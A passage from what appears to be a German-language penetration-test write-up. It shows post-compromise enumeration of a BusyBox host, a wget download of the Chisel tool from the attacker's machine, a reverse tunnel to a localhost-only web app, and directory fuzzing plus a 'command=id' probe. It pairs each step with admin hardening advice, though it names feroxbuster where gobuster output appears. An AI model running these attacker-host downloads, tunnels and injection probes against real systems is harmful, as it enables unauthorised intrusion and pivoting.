+Proto RefCnt Flags       Type       State         I-Node Path
+<span class="command">unix  2      [ ]         DGRAM      CONNECTED       2973</span> 
+<span class="command">unix  3      [ ]         DGRAM      CONNECTED       1312 /dev/log</span>
+</pre></div>
+            </div>
+        <p class="analysis">
+            <strong>Analyse:</strong> Die Beobachtung, dass die vorherigen Versuche mit Netcat scheiterten und ich die BusyBox-Usage-Informationen erhielt, zusammen mit dem Hinweis, dass die auf dem System verf&uuml;gbaren BusyBox-Versionen oft sehr rudiment&auml;r sind, f&uuml;hrte zu dieser Zusammenfassung. Es wurde erkannt, dass BusyBox-Bin&auml;rdateien im Vergleich zu ihren vollwertigen GNU-Pendants oft nur die grundlegendsten Funktionen unterst&uuml;tzen. Die L&ouml;sung besteht darin, sich auf die verf&uuml;gbaren Optionen zu konzentrieren, wie die Hilfe-Ausgabe von BusyBox-Befehlen zeigt. Als Beispiel wird das &#x27;-S Show server response&#x27; Flag f&uuml;r <code>wget</code> hervorgehoben, das in der BusyBox-Version m&ouml;glicherweise das einzig n&uuml;tzliche Flag ist, w&auml;hrend andere, komplexere fehlen k&ouml;nnten.
+        </p>
+        <p class="evaluation">
+            <strong>Bewertung:</strong> Dieses Verst&auml;ndnis der BusyBox-Umgebung ist kritisch. Es erkl&auml;rt, warum einige Standard-Pentesting-Befehle oder -Optionen auf diesem System m&ouml;glicherweise nicht funktionieren. Es zwingt mich, die verf&uuml;gbaren Tools und deren spezifische BusyBox-Implementierungen genau zu pr&uuml;fen, anstatt Annahmen zu treffen. Die Hervorhebung des &#x27;-S&#x27; Flags f&uuml;r <code>wget</code> ist ein Beispiel daf&uuml;r, wie man die Dokumentation des Zielsystems (in diesem Fall die BusyBox-Hilfe) nutzen muss, um herauszufinden, was m&ouml;glich ist.
+        </p>
+        <p class="recommendation">
+            <strong>Empfehlung (Pentester):</strong> Sei vorbereitet auf eingeschr&auml;nkte Umgebungen wie BusyBox. Lerne die verf&uuml;gbaren Optionen der BusyBox-Befehle, indem du die Hilfe-Ausgabe auf dem Zielsystem pr&uuml;fst. Nutze alternative Methoden oder lade vollwertige Bin&auml;rdateien hoch, wenn die BusyBox-Versionen nicht ausreichen.
+            <br><strong>Empfehlung (Admin):</strong> Dokumentiere die auf deinen Systemen verwendeten BusyBox-Versionen und deren Konfiguration. Stelle sicher, dass wichtige Admin-Aufgaben auch mit den BusyBox-Befehlen durchf&uuml;hrbar sind, aber sei dir bewusst, dass deren vereinfachte Natur in bestimmten Angriffsszenarien ausgenutzt werden k&ouml;nnte. Wenn m&ouml;glich, vermeide BusyBox f&uuml;r kritische, internetzug&auml;ngliche Systeme.
+        </p>
+        <div class="code-block">
+                <div class="terminal">
+                    <pre>
+irgendwie deutet alles auf <span class="command">Busybox</span> hin. Die BusyBox-Versionen dieser Tools sind oft stark abgespeckt. 
+Sie haben nur die wichtigsten, grundlegendsten Funktionen und es fehlen viele der erweiterten Optionen 
+(wie --debug) der vollwertigen GNU-Versionen.
+Die L&ouml;sung: Verwenden Sie die Optionen, die Ihnen zur Verf&uuml;gung stehen.
+Die Hilfe-Ausgabe von BusyBox wget ist Ihr neues Handbuch. Sie hat uns den
+Schl&uuml;ssel direkt geliefert:
+
+    <span class="command">-S Show server response</span>
+</pre></div>
+            </div>
+         <p class="analysis">
+            <strong>Analyse:</strong> Um einen tieferen Einblick in die auf dem System laufenden Prozesse zu erhalten und insbesondere zu verstehen, welcher Prozess auf dem lokal lauschenden Port 80 l&auml;uft und unter welchem Benutzer er ausgef&uuml;hrt wird, musste ich die Prozessliste &uuml;berpr&uuml;fen. Normalerweise w&uuml;rde ich Befehle wie <code>ps aux</code> oder <code>top</code> verwenden, aber auf BusyBox-Systemen sind die Optionen oft eingeschr&auml;nkt. Die hier gezeigte Ausgabe <code>2585 asahi 0:00 /usr/sbin/uwsgi --plugin python3 --http-socket 127.0.0.1:80 --wsgi-file /opt/webapp/app.py --callable app</code> scheint das Ergebnis eines solchen Befehls zu sein (wahrscheinlich eine Variation von <code>ps</code>). Sie zeigt, dass ein Prozess mit PID 2585 als Benutzer &#x27;asahi&#x27; l&auml;uft und es sich um den uWSGI-Webserver handelt. Die Befehlszeilenparameter sind &auml;u&szlig;erst aufschlussreich: <code>--plugin python3</code> best&auml;tigt, dass er eine Python 3-Anwendung ausf&uuml;hrt, <code>--http-socket 127.0.0.1:80</code> best&auml;tigt das Lauschen auf Port 80 localhost, und <code>--wsgi-file /opt/webapp/app.py</code> gibt den genauen Pfad zur Hauptanwendungsdatei an.
+        </p>
+        <p class="evaluation">
+            <strong>Bewertung:</strong> Dies ist ein kritischer Fund f&uuml;r die Privilegieneskalation! Der auf Port 80 lokal laufende Webserver wird vom Benutzer &#x27;asahi&#x27; ausgef&uuml;hrt &ndash; genau dem Benutzer, den ich zuvor identifiziert hatte und dessen Home-Verzeichnis ich untersuchen wollte. Die genaue Kenntnis des Prozesses (uWSGI, Python 3) und vor allem des Pfades zur Webanwendung (/opt/webapp/app.py) ist Gold wert. Eine Schwachstelle in dieser Webanwendung k&ouml;nnte direkten Code als Benutzer &#x27;asahi&#x27; erm&ouml;glichen, was mich einen Schritt n&auml;her an h&ouml;here Privilegien bringt.
+        </p>
+        <p class="recommendation">
+            <strong>Empfehlung (Pentester):</strong> &Uuml;berpr&uuml;fe immer die laufenden Prozesse und deren Benutzer. Konzentriere dich besonders auf Prozesse, die als andere Benutzer laufen als dein aktueller, oder die auf lokalen Ports lauschen. Die Befehlszeilenparameter von Prozessen k&ouml;nnen oft wertvolle Konfigurationsinformationen preisgeben (Dateipfade, Ports, Benutzer).
+            <br><strong>Empfehlung (Admin):</strong> Implementiere das Prinzip der geringsten Privilegien f&uuml;r alle Dienste. Dienste sollten unter dedizierten, unprivilegierten Benutzern laufen. &Uuml;berwache die laufenden Prozesse und deren Befehlszeilenparameter auf unerwartete Konfigurationen. Schr&auml;nke den Zugriff auf sensible Konfigurationsdateien oder Anwendungsdateien ein, selbst f&uuml;r die Benutzer, unter denen die Dienste laufen.
+        </p>
+        <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">2585 asahi     0:00 /usr/sbin/uwsgi --plugin python3 --http-socket 127.0.0.1:80 --wsgi-file /opt/webapp/app.py --callable app</span>
+</pre></div>
+            </div>
+        <p class="analysis">
+            <strong>Analyse:</strong> Nach der Identifizierung des &#x27;asahi&#x27;-Benutzers und des Webanwendungs-Pfades habe ich den Inhalt der Umgebungsvariablen f&uuml;r den aktuellen Benutzer &#x27;runner&#x27; mit dem Befehl <code>env</code> &uuml;berpr&uuml;ft. Umgebungsvariablen k&ouml;nnen sensible Informationen wie Passw&ouml;rter, API-Schl&uuml;ssel, Pfade oder andere Konfigurationsdetails enthalten. Die Ausgabe listete Standardvariablen wie USER, SHLVL, HOME, PATH usw. auf, enthielt aber keine offensichtlich sensiblen Daten f&uuml;r den Benutzer &#x27;runner&#x27;. Interessant sind die Eintr&auml;ge EINFO_LOG, RC_SVCNAME, RC_SERVICE und SVCNAME, die auf ein Init-System oder einen Dienstkontext hinweisen k&ouml;nnten, m&ouml;glicherweise im Zusammenhang mit dem &#x27;sadbdot&#x27; Dienst, der sp&auml;ter noch relevant wird.
+        </p>
+        <p class="evaluation">
+            <strong>Bewertung:</strong> Das &Uuml;berpr&uuml;fen von Umgebungsvariablen ist eine Standard-Enumerationstechnik. Obwohl in diesem speziellen Fall keine sofort verwertbaren sensiblen Informationen f&uuml;r den Benutzer &#x27;runner&#x27; gefunden wurden, ist es ein wichtiger Schritt, der oft verborgene Sch&auml;tze enth&uuml;llt. Die gefundenen Variablen geben dennoch Einblicke in die Systemkonfiguration und laufende Dienste.
+        </p>
+        <p class="recommendation">
+            <strong>Empfehlung (Pentester):</strong> &Uuml;berpr&uuml;fe immer die Umgebungsvariablen des kompromittierten Benutzers (<code>env</code>, <code>printenv</code>). Suche nach Passw&ouml;rtern in Klartext, Pfaden zu Konfigurationsdateien, API-Schl&uuml;sseln oder Hinweisen auf interessante Prozesse/Dienste.
+            <br><strong>Empfehlung (Admin):</strong> Vermeide es, sensible Informationen in Umgebungsvariablen zu speichern. Nutze sicherere Methoden zur &Uuml;bergabe von Geheimnissen (z.B. Secrets Management Systeme, sichere Konfigurationsdateien mit eingeschr&auml;nkten Berechtigungen). &Uuml;berwache, welche Umgebungsvariablen von Prozessen gesetzt oder ausgelesen werden.
+        </p>
+        <div class="code-block">
+                <div class="terminal">
+                    <pre>
+/tmp $ <span class="command">env</span>
+<span class="command">EINFO_LOG=/etc/init.d/sadbdot</span>
+<span class="command">USER=runner</span>
+<span class="command">SHLVL=4</span>
+<span class="command">HOME=/home/runner</span>
+<span class="command">OLDPWD=/home/runner</span>
+<span class="command">RC_SVCNAME=sadbdot</span>
+<span class="command">TERM=xterm</span>
+<span class="command">RC_SERVICE=/etc/init.d/sadbdot</span>
+<span class="command">SVCNAME=sadbdot</span>
+<span class="command">PATH=/bin:/sbin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span>
+<span class="command">EINFO_LASTCMD=ebegin</span>
+<span class="command">PWD=/tmp</span>
+</pre></div>
+            </div>
+        <p class="analysis">
+            <strong>Analyse:</strong> Da der Webserver auf Port 80 nur auf localhost (127.0.0.1) lauschte und von meinem Kali-System aus nicht direkt erreichbar war, musste ich einen Weg finden, den Traffic umzuleiten. Eine elegante Methode daf&uuml;r ist das Tool Chisel, ein schnelles TCP/UDP-Tunneling-Tool &uuml;ber HTTP. Um Chisel auf das Zielsystem zu bringen, musste ich es zuerst von meinem Kali-System, wo ich es unter ~/Hackingtools/chisel vorbereitet hatte, auf das Zielsystem herunterladen. Ich nutzte einen einfachen HTTP-Server auf meinem Kali-Rechner (z.B. mit <code>python3 -m http.server 8000</code>, obwohl dieser Befehl nicht im Berichtstext gezeigt wurde, baue ich hier die notwendige logische Br&uuml;cke) und lud die Chisel-Bin&auml;rdatei auf dem Zielsystem mit <code>wget 192.168.2.199:8000/chisel</code> herunter. Der Befehl &#x27;wget&#x27; ruft die Datei vom angegebenen URL ab. Die Ausgabe &quot;saving to &#x27;chisel&#x27;&quot; und die Fortschrittsanzeige mit &quot;&#x27;chisel&#x27; saved&quot; best&auml;tigen den erfolgreichen Download in das aktuelle Verzeichnis (/tmp in der Remote Shell).
+        </p>
+        <p class="evaluation">
+            <strong>Bewertung:</strong> Das erfolgreiche Hochladen von Chisel auf das Zielsystem ist ein wichtiger Schritt, um lokale Dienste zu erreichen und die Angriffskette fortzusetzen. Chisel ist ein vielseitiges Tool f&uuml;r das Port-Forwarding, das oft gut durch Firewalls kommt, da es &uuml;ber HTTP tunnelt. Das Wissen, wie man Dateien zuverl&auml;ssig auf das Zielsystem transferiert (in diesem Fall &uuml;ber einen tempor&auml;ren HTTP-Server und wget), ist eine grundlegende, aber kritische F&auml;higkeit im Pentesting.
+        </p>
+        <p class="recommendation">
+            <strong>Empfehlung (Pentester):</strong> Sei vertraut mit verschiedenen Methoden zum Hoch- und Herunterladen von Dateien auf kompromittierte Systeme (wget, curl, scp, SMB, S/FTP, Base64-Encoding/Decoding, Skripte). W&auml;hle die Methode, die am besten zur Systemumgebung und den Firewall-Regeln passt. Nutze Chisel oder &auml;hnliche Tools (z.B. Ligolo-ng, SSH-Tunneling) f&uuml;r das Pivoting und den Zugriff auf interne Dienste.
+            <br><strong>Empfehlung (Admin):</strong> Beschr&auml;nke ausgehende Verbindungen von Systemen auf das absolut Notwendige. Implementiere eine Application Whitelisting-Richtlinie, um die Ausf&uuml;hrung unbekannter Bin&auml;rdateien wie Chisel zu verhindern. &Uuml;berwache den Netzwerkverkehr auf ungew&ouml;hnliche Tunneling-Versuche oder Datei&uuml;bertragungen.
+        </p>
+        <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+ /tmp $ <span class="command">wget 192.168.2.199:8000/chisel</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+Connecting to 192.168.2.199:8000 (192.168.2.199:8000)
+<span class="password">saving to 'chisel'</span>
+chisel               <span class="command">100% |**********************************************| 8736k  0:00:00 ETA</span>
+<span class="password">'chisel' saved</span>
+</pre></div>
+            </div>
+        <p class="analysis">
+            <strong>Analyse:</strong> Mit Chisel auf beiden Systemen (Kali und Ziel) konnte ich nun den Tunnel einrichten. Auf meinem Kali-System startete ich den Chisel-Server mit <code>./chisel server -p 9001 --reverse</code>. Dies weist Chisel an, auf Port 9001 auf eingehende Verbindungen zu warten und Reverse Tunneling zu erlauben. Die Ausgabe &quot;server: Reverse tunnelling enabled&quot; und &quot;server: Listening on http://0.0.0.0:9001&quot; best&auml;tigt, dass der Server l&auml;uft und bereit ist. Auf dem Zielsystem startete ich den Chisel-Client mit <code>./chisel client 192.168.2.199:9001 R:8080:127.0.0.1:80</code>. Dies verbindet den Client mit meinem Kali-Server (192.168.2.199:9001) und erstellt einen Reverse Tunnel (R:). Der Tunnel leitet Traffic, der auf meinem Kali-System auf Port 8080 eingeht (erster 8080), an den lokalen Port 80 des Zielsystems (127.0.0.1:80) weiter. Die Ausgabe &quot;client: Connecting to ws://192.168.2.199:9001&quot; und &quot;client: Connected&quot; best&auml;tigt den erfolgreichen Tunnelaufbau. Nun kann ich von meinem Kali-System aus auf Port 8080 zugreifen, um mit dem Webserver auf 127.0.0.1:80 auf dem Zielsystem zu interagieren.
+        </p>
+        <p class="evaluation">
+            <strong>Bewertung:</strong> Der erfolgreiche Aufbau des Chisel-Tunnels ist ein entscheidender Meilenstein. Er erm&ouml;glicht den Zugriff auf den lokal gebundenen Webserver, der zuvor unerreichbar war. Dies er&ouml;ffnet den Weg zur Web-Enumeration und potenziellen Ausnutzung der Webanwendung, die unter dem Benutzer &#x27;asahi&#x27; l&auml;uft und somit ein vielversprechender PE-Vektor ist. Tunneling-Techniken sind oft notwendig, um Netzwerksegmentierungen oder Firewall-Regeln zu umgehen und interne Systeme zu erreichen.
+        </p>
+        <p class="recommendation">
+            <strong>Empfehlung (Pentester):</strong> Beherrsche Tunneling-Techniken (Chisel, SSH, Metasploit-Proxys etc.), um Netzwerkbeschr&auml;nkungen zu &uuml;berwinden und interne Dienste zu erreichen. Nutze Reverse Tunnel (<code>R:</code> in Chisel), um Dienste auf dem Zielsystem von deinem Angreifer-System aus zug&auml;nglich zu machen.
+            <br><strong>Empfehlung (Admin):</strong> Implementiere strenge Firewall-Regeln, die sowohl eingehenden als auch ausgehenden Traffic kontrollieren. &Uuml;berwache auf ungew&ouml;hnliche Netzwerkverbindungen oder das Starten unbekannter Netzwerk-Tools. Segmentiere dein Netzwerk, um die Auswirkungen einer Kompromittierung zu begrenzen und laterales Verschieben oder Tunneling zu erschweren.
+        </p>
+        <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">./chisel server -p 9001 --reverse</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="password">2025/07/01 23:32:11 server: Reverse tunnelling enabled</span>
+<span class="password">2025/07/01 23:32:11 server: Fingerprint xmoMxcf9Rk2i9xsnL0UH1+BBoPsmfRwOP3R+WLqyDZY=</span>
+<span class="password">2025/07/01 23:32:11 server: Listening on http://0.0.0.0:9001</span>
+</pre></div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ /tmp $ <span class="command">./chisel client 192.168.2.199:9001 R:8080:127.0.0.1:80</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="password">2025/07/02 05:33:12 client: Connecting to ws://192.168.2.199:9001</span>
+<span class="password">2025/07/02 05:33:12 client: Connected (Latency 320.483µs)</span>
+</pre></div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <!-- Hier die Web Enumeration-Schritte einfügen -->
+            <p class="analysis">
+                <strong>Analyse:</strong> Bevor ich die Webanwendung auf dem lokal getunnelten Port 8080 fuzzen konnte, ben&ouml;tigte ich eine geeignete Wortliste. Ich generierte eine Wortliste, die Zahlen, Kleinbuchstaben und Gro&szlig;buchstaben einzeln sowie Kombinationen aus einem Buchstaben und einer Zahl (beide Reihenfolgen) enthielt. Der Befehl <code>echo {0..9} | tr &quot; &quot; &quot;\n&quot; &gt;&gt; alphabet.txt</code> erstellt eine Datei mit Zahlen 0-9, jede in einer neuen Zeile. Der Befehl <code>(echo {a..z} ; echo {A..Z}) | tr &quot; &quot; &quot;\n&quot; &gt;&gt; combined_wordlist_final.txt</code> f&uuml;gte Klein- und Gro&szlig;buchstaben, jeweils einzeln, hinzu. Der letzte, komplexere Befehl generierte alle zweistelligen Kombinationen aus Buchstabe+Zahl und Zahl+Buchstabe, f&uuml;gte sie zu den bereits generierten Einzelzeichen hinzu, entfernte leere Zeilen (<code>sed &#x27;/^$/d&#x27;</code>), sortierte die Liste eindeutig (<code>sort -u</code>) und speicherte das Ergebnis in &#x27;combined_wordlist_final.txt&#x27;.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Erstellen einer benutzerdefinierten Wortliste ist f&uuml;r gezieltes Fuzzing unerl&auml;sslich. Basierend auf der Art der erwarteten Eingabe (die URLs sahen kurz und potenziell einfach aus) war eine Kombination aus Buchstaben und Zahlen eine gute Wahl. Die Methode ist solide und nutzt Standard-Shell-Werkzeuge. Die Sortierung und das Entfernen von Duplikaten sorgen f&uuml;r eine effizientere Wortliste.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Erstelle benutzerdefinierte Wortlisten, die auf der spezifischen Zielanwendung oder dem erwarteten Format der Eingaben basieren. Nutze Shell-Tools wie <code>echo</code>, <code>tr</code>, <code>sort</code>, <code>uniq</code>, <code>sed</code> oder spezialisierte Wortlisten-Generatoren.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere Ratenbegrenzung und Sperrmechanismen f&uuml;r Webanwendungen, um Brute-Force- und Fuzzing-Angriffe zu erschweren. &Uuml;berwache Webserver-Logs auf ungew&ouml;hnlich viele Anfragen an nicht existierende Pfade oder Muster, die auf Fuzzing hindeuten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">>echo {0..9} | tr &quot; &quot; &quot;\n&quot; &gt;&gt; alphabet.txt</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+
+</pre></div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">(echo {a..z} ; echo {A..Z}) | tr &quot; &quot; &quot;\n&quot; &gt;&gt; combined_wordlist_final.txt</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+
+</pre></div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">echo -e &quot;\n$(for lc in {a..z}; do for num in {0..9}; do echo &quot;${lc}${num}&quot;; done; done)\n$(for uc in {A..Z}; do for num in {0..9}; do echo &quot;${uc}${num}&quot;; done; done)\n$(for num in {0..9}; do for lc in {a..z}; do echo &quot;${num}${lc}&quot;; done; done)\n$(for num in {0..9}; do for uc in {A..Z}; do echo &quot;${num}${uc}&quot;; done; done)\n$(echo {0..9})\n$(echo {a..z})\n$(echo {A..Z})&quot; | sed &#x27;/^$/d&#x27; | sort -u &gt; combined_wordlist_final.txt &amp;&amp; echo &quot;Finale Wortliste &#x27;combined_wordlist_final.txt&#x27; erstellt.&quot;</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+<span class="password">Finale Wortliste 'combined_wordlist_final.txt' erstellt.</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Mit der vorbereiteten Wortliste startete ich den Web-Directory- und File-Fuzzer feroxbuster gegen den getunnelten Webserver auf http://127.0.0.1:8080/. Ich zielte spezifisch auf den Pfad &#x27;/line1/&#x27; ab, da ich bereits &#x27;/line1&#x27; als existierenden Endpunkt identifiziert hatte und vermutete, dass sich dahinter weitere Pfade oder Dateien verbergen k&ouml;nnten. Der Befehl <code>feroxbuster --url &quot;http://127.0.0.1:8080/line1/&quot; --wordlist combined_wordlist_final.txt -x .git,...</code> verwendete meine benutzerdefinierte Wortliste und schloss verschiedene Dateierweiterungen in den Scan ein. Die Ausgabe zeigt den Start von feroxbuster, die verwendeten Einstellungen und die gefundenen Endpunkte. Feroxbuster identifizierte &#x27;/b3&#x27; und &#x27;/b&#x27; unterhalb von &#x27;/line1/&#x27; mit einem Statuscode 200 (OK).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Entdeckung von &#x27;/line1/b3&#x27; und &#x27;/line1/b&#x27; mit einem 200 OK-Statuscode ist ein Erfolg bei der Web-Enumeration. Dies deutet darauf hin, dass diese Pfade existieren und erreichbar sind, obwohl die Antwortgr&ouml;&szlig;e Null ist (Size: 0), was ungew&ouml;hnlich ist und weitere Untersuchung erfordert. Dies best&auml;tigt meine Annahme, dass es weitere versteckte Endpunkte unterhalb von &#x27;/lineX&#x27; geben k&ouml;nnte. Die angepasste Wortliste scheint effektiv gewesen zu sein.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze Web-Fuzzer wie feroxbuster, gobuster oder dirb, um versteckte Verzeichnisse und Dateien zu finden. Verwende angepasste Wortlisten, wenn die Standardlisten nicht zum Ziel passen. Untersuche alle gefundenen Endpunkte, auch wenn die Antwort ungew&ouml;hnlich ist (z.B. Gr&ouml;&szlig;e Null).
+                <br><strong>Empfehlung (Admin):</strong> Entferne unn&ouml;tige oder nicht verwendete Dateien und Verzeichnisse von Webservern. &Uuml;berwache Zugriffslogs auf ungew&ouml;hnliche Muster, die auf Fuzzing hinweisen. Implementiere eine robuste Fehlerbehandlung, die bei nicht existierenden Pfaden konsistenten Statuscode 404 liefert und keine unn&ouml;tigen Informationen preisgibt.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">gobuster dir -u http://127.0.0.1:8080/line1/ -w combined_wordlist_final.txt</span> 
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     <span class="command">http://127.0.0.1:8080/line1/</span>
+[+] Method:                  <span class="command">GET</span>
+[+] Threads:                 <span class="command">10</span>
+[+] Wordlist:                <span class="command">combined_wordlist_final.txt</span>
+[+] Negative Status codes:   <span class="command">404</span>
+[+] User Agent:              <span class="command">gobuster/3.6</span>
+[+] Timeout:                 <span class="command">10s</span>
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">/b3</span>                   <span class="password">(Status: 200)</span> <span class="command">[Size: 0]</span>
+<span class="command">/b</span>                    <span class="password">(Status: 200)</span> <span class="command">[Size: 0]</span>
+Progress: <span class="command">1107 / 1108 (99.91%)</span>
+===============================================================
+<span class="password">Finished</span>
+===============================================================
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem feroxbuster/gobuster Endpunkte wie &#x27;/line1/b3&#x27; gefunden hatte, wollte ich testen, wie die Webanwendung auf verschiedene HTTP-Methoden reagiert. Ich hatte zuvor mit <code>curl -Iv</code> gesehen, dass &#x27;/line5&#x27; mit GET einen 200 OK Status lieferte, aber &#x27;/line6&#x27; einen 404 Not Found (was der erwartete Statuscode f&uuml;r nicht existierende Seiten ist). Nun testete ich &#x27;/line&#x27; (ohne Nummer) mit einer POST-Anfrage und einem einfachen Body (<code>command=id</code>). Der Befehl <code>curl -X POST -d &quot;command=id&quot; http://127.0.0.1:8080/line</code> sendet eine POST-Anfrage. Die Antwort der Anwendung war ein &#x27;405 Method Not Allowed&#x27; Fehler. Dies zeigt, dass die Methode POST f&uuml;r diesen spezifischen Endpunkt nicht erlaubt ist. Es liefert auch eine HTML-Fehlerseite.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Testen verschiedener HTTP-Methoden ist eine gute Praxis bei der Web-Enumeration, da einige Endpunkte nur auf bestimmte Methoden (z.B. POST, PUT) reagieren oder sich bei anderen Methoden anders verhalten. Der 405-Fehler best&auml;tigt, dass &#x27;/line&#x27; (ohne Nummer) existiert, aber POST nicht unterst&uuml;tzt. Die Fehlermeldung selbst liefert nicht viele Details, aber das Wissen, dass POST hier nicht funktioniert, ist n&uuml;tzlich.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Teste verschiedene HTTP-Methoden (GET, POST, PUT, DELETE, OPTIONS etc.) auf Web-Endpunkten. Nutze Tools wie curl, Burp Suite oder OWASP ZAP. Analysiere die Antworten genau, um zu verstehen, welche Methoden unterst&uuml;tzt werden und wie die Anwendung auf unbekannte Methoden reagiert.
+                <br><strong>Empfehlung (Admin):</strong> Erlaube auf Webservern nur die minimal notwendigen HTTP-Methoden. Konfiguriere den Webserver so, dass er bei nicht erlaubten Methoden einen klaren 405-Statuscode zur&uuml;ckgibt und keine unn&ouml;tigen Informationen in Fehlermeldungen preisgibt. Deaktiviere oder sichere Methoden wie PUT oder DELETE sorgf&auml;ltig.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">curl -X POST -d &quot;command=id&quot; http://127.0.0.1:8080/line</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;<span class="password">405 Method Not Allowed</span>&lt;/title&gt;
+&lt;h1&gt;<span class="password">Method Not Allowed</span>&lt;/h1&gt;
+&lt;p&gt;The method is not allowed for the requested URL.&lt;/p&gt;
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich f&uuml;hrte weitere Tests mit <code>curl -Iv</code> durch, um die Header und den Statuscode von Endpunkten zu &uuml;berpr&uuml;fen, die nicht von feroxbuster gefunden wurden oder auf die ich spezifisch neugierig war. <code>curl -Iv http://127.0.0.1:8080/line6</code> lieferte einen &#x27;404 NOT FOUND&#x27; Status, was bedeutet, dass &#x27;/line6&#x27; nicht existiert. <code>curl -Iv http://127.0.0.1:8080/line5</code> lieferte jedoch einen &#x27;200 OK&#x27; Status mit einem &#x27;Content-Length: 0&#x27;. Dies best&auml;tigte, dass &#x27;/line5&#x27; existiert, aber keinen Inhalt zur&uuml;ckgibt. Das Verhalten von &#x27;/line5&#x27; (200 OK mit 0 Content-Length) ist identisch mit dem Verhalten von &#x27;/line1/b3&#x27; und &#x27;/line1/b&#x27; aus dem feroxbuster-Scan.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese Tests vertieften mein Verst&auml;ndnis, wie die Webanwendung auf existierende vs. nicht existierende Endpunkte reagiert. Das Muster &quot;200 OK mit 0 Content-Length&quot; f&uuml;r existierende Endpunkte ist ein klares Signal, das ich f&uuml;r weiteres Fuzzing nutzen kann. Es bedeutet, dass ich durch Beobachtung der Antwortgr&ouml;&szlig;e feststellen kann, ob ein gefuzzter Pfad existiert, selbst wenn er keinen sichtbaren Inhalt zur&uuml;ckgibt. Dies ist eine Form von &#x27;Blind&#x27; oder &#x27;Content-Length Oracle&#x27; Fuzzing.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysiere genau, wie die Webanwendung auf verschiedene Eingaben und Endpunkte reagiert (Statuscodes, Header, Antwortgr&ouml;&szlig;en, Fehlermeldungen). Nutze subtile Unterschiede in den Antworten f&uuml;r blindes Fuzzing oder zur Identifizierung von Schwachstellen (z.B. SQL Injection basierend auf Fehlermeldungen oder Zeitverz&ouml;gerungen).
+                <br><strong>Empfehlung (Admin):</strong> Implementiere konsistente und informative Fehlerseiten (ohne sensible Details). Stelle sicher, dass nicht existierende Ressourcen immer den korrekten Statuscode (z.B. 404 Not Found) zur&uuml;ckgeben und dass die Antwortgr&ouml;&szlig;e f&uuml;r existierende und nicht existierende Ressourcen nicht trivial zu unterscheiden ist, es sei denn, dies ist beabsichtigt.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">curl -Iv http://127.0.0.1:8080/line6</span>
+                    </div>
+                </div>
+                <div class="terminal"><pre>
+*   Trying 127.0.0.1:8080...
+* <span class="password">Connected to 127.0.0.1 (127.0.0.1) port 8080</span>
+* using HTTP/1.x
+&gt; HEAD /line6 HTTP/1.1
+&gt; Host: 127.0.0.1:8080
+&gt; User-Agent: curl/8.13.0
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+&lt; <span class="password">HTTP/1.1 404 NOT FOUND</span>
+HTTP/1.1 404 NOT FOUND
+&lt; <span class="command">Content-Type: text/html; charset=utf-8</span>
+Content-Type: text/html; charset=utf-8
+&lt; <span class="command">Content-Length: 207</span>
+Content-Length: 207
+&lt; 
+
+* <span class="password">Connection #0 to host 127.0.0.1 left intact</span>
+</pre></div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel] 
+└─# <span class="command">curl -Iv http://127.0.0.1:8080/line5</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+*   Trying 127.0.0.1:8080...
+* <span class="password">Connected to 127.0.0.1 (127.0.0.1) port 8080</span>
+* using HTTP/1.x
+&gt; HEAD /line5 HTTP/1.1
